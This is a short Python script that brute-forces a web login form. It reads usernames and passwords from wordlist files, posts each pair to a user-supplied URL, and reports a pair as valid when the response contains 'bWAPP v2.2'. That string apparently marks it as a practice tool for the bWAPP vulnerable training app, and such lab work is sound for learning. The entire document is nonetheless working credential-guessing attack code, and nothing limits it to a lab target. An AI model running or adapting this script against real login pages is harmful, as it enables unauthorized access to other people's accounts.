import sys,pwn,requests

target = input("Provide full URL of the target(ex:http://exmp:8080) : ")
needle = "bWAPP v2.2"

with open("top-usernames.txt","r") as username_list:
    for username in username_list:
        username = username.strip()
        with open("ssh-pass.txt","r") as pass_list:
            for password in pass_list:
                password = password.strip()
                print("[X] Attempting user:pass -> {}:{}\r".format(username.strip(), password))
                
                payload = {"login":username,
                           "password":password,
                           "security_level":"0",
                           "form":"sumbit"
                }
                
                r = requests.post(target,data=payload)
                
                if needle in r.text:
                    print("\n\t[>>>] Valid password '{}' found for user '{}'!".format(password, username))
                    sys.exit()